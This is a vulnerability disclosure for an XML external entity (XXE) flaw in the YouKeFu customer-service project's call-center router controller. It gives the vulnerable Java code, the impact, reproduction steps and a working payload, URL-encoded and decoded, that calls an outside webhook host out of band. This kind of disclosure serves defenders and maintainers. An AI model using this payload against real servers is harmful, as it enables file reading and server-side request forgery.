# cve


Vulnerability Disclosure: XXE in YouKeFu Open-Source Project
1. Basic Information
​Project Name: YouKeFu (优客服)
​Project URL: https://github.com/zhangyanbo2007/youkefu
​Vulnerability Type: XML External Entity (XXE) Injection
​Affected Component: Call Center Router Controller
​CWE Classification: CWE-611 (Improper Restriction of XML External Entity Reference)
2. Vulnerability Details
Location
The vulnerability exists in the router update functionality at:
src/main/java/com/ukefu/webim/web/handler/admin/callcenter/CallCenterRouterController.java

Vulnerable Code
java
SAXReader reader = new SAXReader();
Document document = reader.read(new ByteArrayInputStream(
    ("<?xml version=\"1.0\" encoding=\"utf-8\"?>"+router.getRoutercontent()).getBytes()));
    <img width="1357" alt="image" src="https://github.com/user-attachments/assets/8e23a972-8b6f-4de3-b480-478b944b70c9" />


Impact
Attackers can:

Read arbitrary files from the server filesystem
Conduct server-side request forgery (SSRF) attacks
Potentially escalate to remote code execution in certain configurations

Vulnerability reproduction
First, we need to add a hostid through the "/admin/callcenter/pbxhost/add" interface.
Then we remember this hostid and use another interface to carry out an XXE attack.

We successfully injected the payload through the routercontent parameter and received an out-of-band (OOB) request triggered by the XXE vulnerability on our webhook, as clearly demonstrated in the screenshot below.
<img width="1455" alt="image" src="https://github.com/user-attachments/assets/8d8821e5-c25d-4767-85e0-1481e82e5dcd" />
<img width="1435" alt="image" src="https://github.com/user-attachments/assets/e9e10ce9-fc57-4c03-bdbc-8a2f8a9ed1d8" />

paylod
%3c%21%44%4f%43%54%59%50%45%20%66%6f%6f%20%5b%3c%21%45%4e%54%49%54%59%20%78%78%65%20%53%59%53%54%45%4d%20%22%68%74%74%70%73%3a%2f%2f%77%65%62%68%6f%6f%6b%2e%73%69%74%65%2f%32%64%31%63%30%36%64%35%2d%33%61%37%61%2d%34%35%32%36%2d%39%36%61%35%2d%38%38%36%62%34%31%63%64%35%62%33%62%22%3e%5d%3e%3c%66%6f%6f%3e%26%78%78%65%3b%3c%2f%66%6f%6f%3e

urldecode
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "https://webhook.site/2d1c06d5-3a7a-4526-96a5-886b41cd5b3b">]><foo>&xxe;</foo>
